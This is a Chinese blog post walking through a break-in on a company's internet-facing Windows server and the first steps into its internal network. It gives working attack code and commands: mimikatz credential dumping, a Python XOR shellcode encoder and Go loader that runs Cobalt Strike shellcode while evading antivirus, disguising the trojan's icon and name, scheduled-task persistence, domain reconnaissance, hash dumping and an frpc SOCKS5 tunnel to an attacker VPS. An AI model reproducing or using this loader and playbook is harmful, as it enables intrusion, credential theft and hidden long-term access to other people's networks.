<!DOCTYPE html>
<html lang=zh>
<head>
    <!-- so meta -->
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="HandheldFriendly" content="True">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
    <meta name="description" content="0x01前言昨夜我做了一个长长的梦，梦里我很思念她，她亦很思念我. . . . . . 0x02背景最近在学习内网，温故而知新，所以抽空总结了一下现有的知识，既是分享，也是审视。 0x03上传文件使用一个已知漏洞获取了某公司的公网服务器权限，内网拉开序幕首先确认在这个内网中我是谁，我在哪 是一台win server服务器 system权限 上传mimikatz尝试获取hash 1mimikatz.">
<meta property="og:type" content="article">
<meta property="og:title" content="内网|初探内网渗透(一)">
<meta property="og:url" content="https://mzzdtot.github.io/2021/12/11/%E5%AE%9E%E6%88%98-%E5%86%85%E7%BD%91/index.html">
<meta property="og:site_name" content="m2">
<meta property="og:description" content="0x01前言昨夜我做了一个长长的梦，梦里我很思念她，她亦很思念我. . . . . . 0x02背景最近在学习内网，温故而知新，所以抽空总结了一下现有的知识，既是分享，也是审视。 0x03上传文件使用一个已知漏洞获取了某公司的公网服务器权限，内网拉开序幕首先确认在这个内网中我是谁，我在哪 是一台win server服务器 system权限 上传mimikatz尝试获取hash 1mimikatz.">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/MzzdToT/ibed/imgs/neiwang/1.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/MzzdToT/ibed/imgs/neiwang/2.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/MzzdToT/ibed/imgs/neiwang/3.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/MzzdToT/ibed/imgs/neiwang/4.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/MzzdToT/ibed/imgs/neiwang/6.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/MzzdToT/ibed/imgs/neiwang/7.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/MzzdToT/ibed/imgs/neiwang/81.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/MzzdToT/ibed/imgs/neiwang/9.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/MzzdToT/ibed/imgs/neiwang/10.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/MzzdToT/ibed/imgs/neiwang/11.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/MzzdToT/ibed/imgs/neiwang/12.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/MzzdToT/ibed/imgs/neiwang/13.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/MzzdToT/ibed/imgs/neiwang/yu1.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/MzzdToT/ibed/imgs/neiwang/yu2.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/MzzdToT/ibed/imgs/neiwang/yu3.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/MzzdToT/ibed/imgs/neiwang/yu4.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/MzzdToT/ibed/imgs/neiwang/14.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/MzzdToT/ibed/imgs/neiwang/15.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/MzzdToT/ibed/imgs/neiwang/16.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/MzzdToT/ibed/imgs/neiwang/17.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/MzzdToT/ibed/imgs/neiwang/20.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/MzzdToT/ibed/imgs/neiwang/emo.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/MzzdToT/ibed/imgs/neiwang/18.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/MzzdToT/ibed/imgs/neiwang/19.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/MzzdToT/ibed/imgs/neiwang/21.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/MzzdToT/ibed/imgs/neiwang/22.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/MzzdToT/ibed/imgs/neiwang/23.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/MzzdToT/ibed/imgs/neiwang/24.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/MzzdToT/ibed/imgs/neiwang/25.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/MzzdToT/ibed/imgs/neiwang/26.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/MzzdToT/ibed/imgs/neiwang/27.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/MzzdToT/ibed/imgs/neiwang/28.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/MzzdToT/ibed/imgs/neiwang/29.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/MzzdToT/ibed/imgs/neiwang/30.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/MzzdToT/ibed/imgs/neiwang/31.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/MzzdToT/ibed/imgs/neiwang/32.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/MzzdToT/ibed/imgs/neiwang/33.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/MzzdToT/ibed/imgs/neiwang/34.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/MzzdToT/ibed/imgs/neiwang/35.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/MzzdToT/ibed/imgs/neiwang/36.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/MzzdToT/ibed/imgs/neiwang/37.png">
<meta property="article:published_time" content="2021-12-11T02:53:42.000Z">
<meta property="article:modified_time" content="2021-12-28T08:59:01.255Z">
<meta property="article:author" content="作者">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://cdn.jsdelivr.net/gh/MzzdToT/ibed/imgs/neiwang/1.png">
    
    
        
          
              <link rel="shortcut icon" href="/images/favicon.ico">
          
        
        
          
            <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
          
        
        
          
            <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
          
        
    
    <!-- title -->
    <title>内网|初探内网渗透(一)</title>
    <!-- styles -->
    
<link rel="stylesheet" href="/css/style.css">

    <!-- persian styles -->
    
      
<link rel="stylesheet" href="/css/rtl.css">

    
    <!-- rss -->
    
    
<meta name="generator" content="Hexo 4.2.1"></head>

<body class="max-width mx-auto px3 ltr">
    
      <div id="header-post">
  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
  <span id="menu">
    <span id="nav">
      <ul>
         
          <li><a href="/">首页</a></li>
         
          <li><a href="/about/">关于</a></li>
         
          <li><a href="/archives/">归档</a></li>
         
          <li><a href="https://github.com/MzzdToT" target="_blank" rel="noopener">项目</a></li>
        
      </ul>
    </span>
    <br/>
    <span id="actions">
      <ul>
        
        <li><a class="icon" href="/2021/12/15/%E5%AE%9E%E6%88%98-%E5%86%85%E7%BD%912/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
        
        
        <li><a class="icon" href="/2020/09/11/vulnhub-drupal/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
        
        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
        <li><a class="icon" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
      </ul>
      <span id="i-prev" class="info" style="display:none;">上一篇</span>
      <span id="i-next" class="info" style="display:none;">下一篇</span>
      <span id="i-top" class="info" style="display:none;">返回顶部</span>
      <span id="i-share" class="info" style="display:none;">分享文章</span>
    </span>
    <br/>
    <div id="share" style="display: none">
      <ul>
  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=https://mzzdtot.github.io/2021/12/11/%E5%AE%9E%E6%88%98-%E5%86%85%E7%BD%91/" target="_blank" rel="noopener"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://twitter.com/share?url=https://mzzdtot.github.io/2021/12/11/%E5%AE%9E%E6%88%98-%E5%86%85%E7%BD%91/&text=内网|初探内网渗透(一)" target="_blank" rel="noopener"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=https://mzzdtot.github.io/2021/12/11/%E5%AE%9E%E6%88%98-%E5%86%85%E7%BD%91/&title=内网|初探内网渗透(一)" target="_blank" rel="noopener"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=https://mzzdtot.github.io/2021/12/11/%E5%AE%9E%E6%88%98-%E5%86%85%E7%BD%91/&is_video=false&description=内网|初探内网渗透(一)" target="_blank" rel="noopener"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=内网|初探内网渗透(一)&body=Check out this article: https://mzzdtot.github.io/2021/12/11/%E5%AE%9E%E6%88%98-%E5%86%85%E7%BD%91/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://getpocket.com/save?url=https://mzzdtot.github.io/2021/12/11/%E5%AE%9E%E6%88%98-%E5%86%85%E7%BD%91/&title=内网|初探内网渗透(一)" target="_blank" rel="noopener"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://reddit.com/submit?url=https://mzzdtot.github.io/2021/12/11/%E5%AE%9E%E6%88%98-%E5%86%85%E7%BD%91/&title=内网|初探内网渗透(一)" target="_blank" rel="noopener"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=https://mzzdtot.github.io/2021/12/11/%E5%AE%9E%E6%88%98-%E5%86%85%E7%BD%91/&title=内网|初探内网渗透(一)" target="_blank" rel="noopener"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://digg.com/submit?url=https://mzzdtot.github.io/2021/12/11/%E5%AE%9E%E6%88%98-%E5%86%85%E7%BD%91/&title=内网|初探内网渗透(一)" target="_blank" rel="noopener"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.tumblr.com/share/link?url=https://mzzdtot.github.io/2021/12/11/%E5%AE%9E%E6%88%98-%E5%86%85%E7%BD%91/&name=内网|初探内网渗透(一)&description=" target="_blank" rel="noopener"><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://news.ycombinator.com/submitlink?u=https://mzzdtot.github.io/2021/12/11/%E5%AE%9E%E6%88%98-%E5%86%85%E7%BD%91/&t=内网|初探内网渗透(一)" target="_blank" rel="noopener"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
</ul>

    </div>
    <div id="toc">
      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01前言"><span class="toc-number">1.</span> <span class="toc-text">0x01前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02背景"><span class="toc-number">2.</span> <span class="toc-text">0x02背景</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03上传文件"><span class="toc-number">3.</span> <span class="toc-text">0x03上传文件</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x04木马免杀"><span class="toc-number">4.</span> <span class="toc-text">0x04木马免杀</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x05权限维持"><span class="toc-number">5.</span> <span class="toc-text">0x05权限维持</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x06内网信息收集"><span class="toc-number">6.</span> <span class="toc-text">0x06内网信息收集</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x07内网穿透"><span class="toc-number">7.</span> <span class="toc-text">0x07内网穿透</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x08内网横向"><span class="toc-number">8.</span> <span class="toc-text">0x08内网横向</span></a></li></ol>
    </div>
  </span>
</div>

    
    <div class="content index py4">
        
        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
  <header>
    
    <h1 class="posttitle" itemprop="name headline">
        内网|初探内网渗透(一)
    </h1>



    <div class="meta">
      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
        <span itemprop="name">m2</span>
      </span>
      
    <div class="postdate">
      
        <time datetime="2021-12-11T02:53:42.000Z" itemprop="datePublished">2021-12-11</time>
        
      
    </div>


      

      

    </div>
  </header>
  

  <div class="content" itemprop="articleBody">
    <h2 id="0x01前言"><a href="#0x01前言" class="headerlink" title="0x01前言"></a>0x01前言</h2><p>昨夜我做了一个长长的梦，梦里我很思念她，她亦很思念我. . . . . .</p>
<h2 id="0x02背景"><a href="#0x02背景" class="headerlink" title="0x02背景"></a>0x02背景</h2><p>最近在学习内网，温故而知新，所以抽空总结了一下现有的知识，既是分享，也是审视。</p>
<h2 id="0x03上传文件"><a href="#0x03上传文件" class="headerlink" title="0x03上传文件"></a>0x03上传文件</h2><p>使用一个已知漏洞获取了某公司的公网服务器权限，内网拉开序幕<br>首先确认在这个内网中我是谁，我在哪<br><img src="https://cdn.jsdelivr.net/gh/MzzdToT/ibed/imgs/neiwang/1.png" alt="1"></p>
<p>是一台win server服务器 system权限</p>
<p>上传mimikatz尝试获取hash</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe &quot;privilege::debug&quot; &quot;sekurlsa::logonpasswords full&quot;&quot; exit &gt;&gt; log.txt</span><br></pre></td></tr></table></figure>
<p><img src="https://cdn.jsdelivr.net/gh/MzzdToT/ibed/imgs/neiwang/2.png" alt="2"></p>
<p>执行完直接被删了，procdump也一样</p>
<p>看了一下防火墙和tasklist</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netsh firewall show state</span><br></pre></td></tr></table></figure>
<p>防火墙开了还有杀软<br><img src="https://cdn.jsdelivr.net/gh/MzzdToT/ibed/imgs/neiwang/3.png" alt="3"><br><img src="https://cdn.jsdelivr.net/gh/MzzdToT/ibed/imgs/neiwang/4.png" alt="4"></p>
<p>接下来我可以选择<br>1、上传一个cs免杀马上线cs操作<br>2、使用administrator账户关闭杀软和防火墙</p>
<p>关闭杀软动静过大，不到万不得已我不愿意用此方法，而且测试我的免杀是能用的<br>所以这里使用第二种方法，免杀马上线cs</p>
<h2 id="0x04木马免杀"><a href="#0x04木马免杀" class="headerlink" title="0x04木马免杀"></a>0x04木马免杀</h2><p>免杀方式：使用xor编辑c-shellcode然后用go解密执行</p>
<p><strong>第一步：</strong><br>把cs生成的c-shellcode填入xor的shellcode字段中<br>xor.py内容如下</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line">def xor(shellcode, key):</span><br><span class="line">    new_shellcode &#x3D; &quot;&quot;</span><br><span class="line">    key_len &#x3D; len(key)</span><br><span class="line">    # 对shellcode的每一位进行xor亦或处理</span><br><span class="line">    for i in range(0, len(shellcode)):</span><br><span class="line">        s &#x3D; ord(shellcode[i])</span><br><span class="line">        p &#x3D; ord((key[i % key_len]))</span><br><span class="line">        s &#x3D; s ^ p  # 与p异或，p就是key中的字符之一</span><br><span class="line">        s &#x3D; chr(s)</span><br><span class="line">        new_shellcode +&#x3D; s</span><br><span class="line">    return new_shellcode</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def random_decode(shellcode):</span><br><span class="line">    j &#x3D; 0</span><br><span class="line">    new_shellcode &#x3D; &quot;&quot;</span><br><span class="line">    for i in range(0,len(shellcode)):</span><br><span class="line">        if i % 2 &#x3D;&#x3D; 0:</span><br><span class="line">            new_shellcode[i] &#x3D; shellcode[j]</span><br><span class="line">            j +&#x3D; 1</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    return new_shellcode</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def add_random_code(shellcode, key):</span><br><span class="line">    new_shellcode &#x3D; &quot;&quot;</span><br><span class="line">    key_len &#x3D; len(key)</span><br><span class="line">    for i in range(0, len(shellcode)):</span><br><span class="line">        new_shellcode +&#x3D; shellcode[i]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        new_shellcode +&#x3D; key[i % key_len]</span><br><span class="line">    return new_shellcode</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def str_to_hex(shellcode):</span><br><span class="line">    raw &#x3D; &quot;&quot;</span><br><span class="line">    for i in range(0, len(shellcode)):</span><br><span class="line">        s &#x3D; hex(ord(shellcode[i])).replace(&quot;0x&quot;,&#39;,0x&#39;)</span><br><span class="line">        raw &#x3D; raw + s</span><br><span class="line">    return raw</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ &#x3D;&#x3D; &#39;__main__&#39;:</span><br><span class="line">    shellcode&#x3D;&quot;\xfc\x48\x83\...&quot;</span><br><span class="line">    #这是异或和增加随机字符使用的key</span><br><span class="line">    key &#x3D; &quot;planet&quot;</span><br><span class="line">    shellcode &#x3D; xor(shellcode, key)</span><br><span class="line">    shellcode &#x3D; add_random_code(shellcode, key)</span><br><span class="line">    print(str_to_hex(shellcode))</span><br></pre></td></tr></table></figure>
<p>执行xor.py<br><img src="https://cdn.jsdelivr.net/gh/MzzdToT/ibed/imgs/neiwang/6.png" alt="6"><br><strong>第二步</strong><br>把上一步生成的shellcode填到shell.go的shellcode字段中，记得两个文件key要一致。<br>shell.go内容如下</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line">package main</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">import (</span><br><span class="line">  &quot;syscall&quot;</span><br><span class="line">  &quot;time&quot;</span><br><span class="line">  &quot;unsafe&quot;</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">const (</span><br><span class="line">  MEM_COMMIT             &#x3D; 0x1000</span><br><span class="line">  MEM_RESERVE            &#x3D; 0x2000</span><br><span class="line">  PAGE_EXECUTE_READWRITE &#x3D; 0x40 &#x2F;&#x2F; 区域可以执行代码，应用程序可以读写该区域。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">var (</span><br><span class="line">  kernel32      &#x3D; syscall.MustLoadDLL(&quot;kernel32.dll&quot;)</span><br><span class="line">  ntdll         &#x3D; syscall.MustLoadDLL(&quot;ntdll.dll&quot;)</span><br><span class="line">  VirtualAlloc  &#x3D; kernel32.MustFindProc(&quot;VirtualAlloc&quot;)</span><br><span class="line">  RtlCopyMemory &#x3D; ntdll.MustFindProc(&quot;RtlCopyMemory&quot;)</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">func main() &#123;</span><br><span class="line">  mix_shellcode :&#x3D; []byte&#123;0x8c,0x70,...&#125;</span><br><span class="line">  var ttyolller []byte</span><br><span class="line">  key :&#x3D; []byte(&quot;planet&quot;)#xor.py中的key</span><br><span class="line">  var key_size &#x3D; len(key)</span><br><span class="line">  var shellcode_final []byte</span><br><span class="line">  var j &#x3D; 0</span><br><span class="line">  time.Sleep(2)</span><br><span class="line">  &#x2F;&#x2F;fmt.Print(len(mix_shellcode))</span><br><span class="line">  for i :&#x3D; 0; i &lt; len(mix_shellcode); i++ &#123;</span><br><span class="line">    if i%2 &#x3D;&#x3D; 0 &#123;</span><br><span class="line">      shellcode_final &#x3D; append(shellcode_final, mix_shellcode[i])</span><br><span class="line">      j +&#x3D; 1</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  time.Sleep(3)</span><br><span class="line">  &#x2F;&#x2F;fmt.Print(shellcode_final)</span><br><span class="line">  &#x2F;&#x2F; 解密异或</span><br><span class="line">  for i :&#x3D; 0; i &lt; len(shellcode_final); i++ &#123;</span><br><span class="line">    ttyolller &#x3D; append(ttyolller, shellcode_final[i]^key[i%key_size])</span><br><span class="line">  &#125;</span><br><span class="line">  time.Sleep(3)</span><br><span class="line">  addr, _, err :&#x3D; VirtualAlloc.Call(0, uintptr(len(ttyolller)), MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE)</span><br><span class="line">  if err !&#x3D; nil &amp;&amp; err.Error() !&#x3D; &quot;The operation completed successfully.&quot; &#123;</span><br><span class="line">    syscall.Exit(0)</span><br><span class="line">  &#125;</span><br><span class="line">  time.Sleep(3)</span><br><span class="line">  _, _, err &#x3D; RtlCopyMemory.Call(addr, (uintptr)(unsafe.Pointer(&amp;ttyolller[0])), uintptr(len(ttyolller)))</span><br><span class="line">  if err !&#x3D; nil &amp;&amp; err.Error() !&#x3D; &quot;The operation completed successfully.&quot; &#123;</span><br><span class="line">    syscall.Exit(0)</span><br><span class="line">  &#125;</span><br><span class="line">  syscall.Syscall(addr, 0, 0, 0, 0)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>执行go build -ldflags=”-H windowsgui -w -s” shell.go生成shell.exe<br>此时基本已经完成了，但是这个默认的图标太扎眼容易引起怀疑</p>
<p>把shell.exe拖到Restorator右键添加资源，类型选择图标，名称随便起一个<br><img src="https://cdn.jsdelivr.net/gh/MzzdToT/ibed/imgs/neiwang/7.png" alt="7"><br>然后在test处右键导入ico文件即可<br><img src="https://cdn.jsdelivr.net/gh/MzzdToT/ibed/imgs/neiwang/81.png" alt="8"><br>木马改个有迷惑性的名字如printapi、find5tr、he1p等</p>
<p>用冰蝎上传到目标机c:\windows\目录，执行上线<br><img src="https://cdn.jsdelivr.net/gh/MzzdToT/ibed/imgs/neiwang/9.png" alt="9"></p>
<h2 id="0x05权限维持"><a href="#0x05权限维持" class="headerlink" title="0x05权限维持"></a>0x05权限维持</h2><p>一般获得一个cs会话后先把beacin迁移到一个不易被关闭的进程如explorer.exe桌面进程</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">shell tasklist|findstr explorer.exe</span><br><span class="line">inject 5008 x64</span><br></pre></td></tr></table></figure>
<p><img src="https://cdn.jsdelivr.net/gh/MzzdToT/ibed/imgs/neiwang/10.png" alt="10"></p>
<p>这台服务器是内网的入口我觉得有必要做一下权限维持。<br>常用以下几种方法维持权限：<br>1、注册表添加启动项<br><img src="https://cdn.jsdelivr.net/gh/MzzdToT/ibed/imgs/neiwang/11.png" alt="11"></p>
<p>2、使用远程下载exe自启动<br><img src="https://cdn.jsdelivr.net/gh/MzzdToT/ibed/imgs/neiwang/12.png" alt="12"><br>输入木马存放地址即可</p>
<p>3、计划任务<br>指定每天上午9.30运行我们放在c:\windows\目录下的木马文件</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">schtasks &#x2F;create &#x2F;TN cs &#x2F;TR C:\windows\printapi.exe &#x2F;SC daily &#x2F;mo 1 &#x2F;ST 09:30:00</span><br></pre></td></tr></table></figure>
<p><img src="https://cdn.jsdelivr.net/gh/MzzdToT/ibed/imgs/neiwang/13.png" alt="13"></p>
<h2 id="0x06内网信息收集"><a href="#0x06内网信息收集" class="headerlink" title="0x06内网信息收集"></a>0x06内网信息收集</h2><p>net view/domaiin查看域<br><img src="https://cdn.jsdelivr.net/gh/MzzdToT/ibed/imgs/neiwang/yu1.png" alt="yu1"><br>net view /domain:域名称 查看域内机器主机名<br><img src="https://cdn.jsdelivr.net/gh/MzzdToT/ibed/imgs/neiwang/yu2.png" alt="yu2"><br>dsquery user 查看存在的用户<br><img src="https://cdn.jsdelivr.net/gh/MzzdToT/ibed/imgs/neiwang/yu3.png" alt="yu3"><br>net group “Domain admins” /domain查询域管理员组<br><img src="https://cdn.jsdelivr.net/gh/MzzdToT/ibed/imgs/neiwang/yu4.png" alt="yu4"><br>域管用户nicole</p>
<p><strong>定位域控</strong><br>nslookup domain<br><img src="https://cdn.jsdelivr.net/gh/MzzdToT/ibed/imgs/neiwang/14.png" alt="14"><br>systeminfo<br><img src="https://cdn.jsdelivr.net/gh/MzzdToT/ibed/imgs/neiwang/15.png" alt="15"><br>systeminfo如果domain为workgroup则代表不存在域，否则存在xxx.com域环境<br>ipconfig /all<br><img src="https://cdn.jsdelivr.net/gh/MzzdToT/ibed/imgs/neiwang/16.png" alt="16"><br>一般来说，域控就是dns服务器，所以有时候我们也可以探测内网53端口来寻找域控<br>定位域控服务器：192.168.0.253</p>
<p>但是当我执行net user查看本机用户的时候<br><img src="https://cdn.jsdelivr.net/gh/MzzdToT/ibed/imgs/neiwang/17.png" alt="17"><br>这么多账户信息让我一度以为我就是域控<br>继续net user /domain<br><img src="https://cdn.jsdelivr.net/gh/MzzdToT/ibed/imgs/neiwang/20.png" alt="18"><br><img src="https://cdn.jsdelivr.net/gh/MzzdToT/ibed/imgs/neiwang/emo.png" alt="emo"><br>两者基本吻合<br>不太对劲起来<br>先dump hash再说<br>一般用hashdump或者logonpasswords来读取，但是两者有时候dump下来的hash有差别<br>测试后感觉还是hashdump更准一些<br><img src="https://cdn.jsdelivr.net/gh/MzzdToT/ibed/imgs/neiwang/18.png" alt="19"><br><img src="https://cdn.jsdelivr.net/gh/MzzdToT/ibed/imgs/neiwang/19.png" alt="20"><br>看这个hash基本全是空密码</p>
<h2 id="0x07内网穿透"><a href="#0x07内网穿透" class="headerlink" title="0x07内网穿透"></a>0x07内网穿透</h2><p>用这台服务器搭让我们与对方内网建立连接，方便内网横向移动<br>首先使用cs或者webshell上传frpc到目标机，cs可以用Certutil命令或者文件管理上传<br>frpc.ini配置如下</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">[common]</span><br><span class="line">server_addr &#x3D;42.xxx.xxx.xxx #vps IP</span><br><span class="line">server_port &#x3D; 7000</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[socks5]</span><br><span class="line">type &#x3D; tcp</span><br><span class="line">remote_port &#x3D; 60000 #服务端用60000端口转发给本机</span><br><span class="line">plugin &#x3D; socks5</span><br><span class="line">use_encryption &#x3D; true #启用加密 [通信内容加密传输，有效防止流量被拦截]</span><br><span class="line">use_compression &#x3D; true #启用压缩 [传输内容进行压缩，有效减小传输的网络流量，加快流量转发速度，但会额外消耗一些CPU资源]</span><br></pre></td></tr></table></figure>

